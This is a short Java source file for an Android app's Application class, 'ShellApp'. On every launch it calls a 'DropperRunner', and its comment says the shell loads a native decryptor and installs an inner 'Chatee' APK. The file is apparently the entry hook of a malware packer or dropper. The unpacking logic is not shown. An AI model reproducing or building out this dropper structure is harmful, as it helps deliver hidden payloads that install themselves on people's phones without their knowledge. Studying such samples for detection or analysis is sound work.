package com.pkg.loader.dispatch;

import android.app.Application;

import com.pkg.loader.dispatch.internal.DropperRunner;

/** Meat-style shell: loads native decrypt + installs inner Chatee APK. */
public class ShellApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        DropperRunner.start(this);
    }
}
